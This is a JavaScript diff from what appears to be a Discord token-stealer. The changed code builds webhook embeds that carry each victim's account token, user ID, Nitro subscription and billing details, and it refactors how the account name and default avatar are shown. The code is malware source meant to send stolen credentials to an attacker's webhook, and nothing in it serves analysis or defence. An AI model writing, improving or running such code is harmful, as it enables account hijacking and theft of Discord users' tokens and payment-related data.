@@ -8,7 +8,7 @@ const { tempFolder } = require('../index');
 const FormData = require('form-data');
 const { rmSync, readFileSync } = require('fs');
 const { userAgent } = require('../config');
-const { nitroSubscriptionType, billingType, accountFlags, avatarURL } = require('../util/discord-account');
+const { nitroSubscriptionType, billingType, accountFlags, avatarURL, defaultAvatar } = require('../util/discord-account');
 const { sleep } = require('../util/general');
 
 if (!webhook.url || typeof webhook.url !== 'string' || !isValidURL(webhook.url)) return;
@@ -46,8 +46,8 @@ const json = async (zipFile) => {
     embeds.push({
       description: `Token: ${codeBlock(account.token)}`,
       author: {
-        name: account.discriminator === '0' ? `${account.global_name} (@${account.username})` : `${account.global_name} (${account.username}#${account.discriminator})`,
-        icon_url: account.avatar ? avatarURL(account.id, account.avatar) : `https://cdn.discordapp.com/embed/avatars/${account.discriminator % 5}.png`
+        name: `${account.global_name} ` + (account.discriminator === '0' ? `(@${account.username})` : `(${account.username}#${account.discriminator})`),
+        icon_url: account.avatar ? avatarURL(account.id, account.avatar) : defaultAvatar(account.id, account.discriminator)
       },
       fields: [
         ['🆔 ID', code(account.id)],
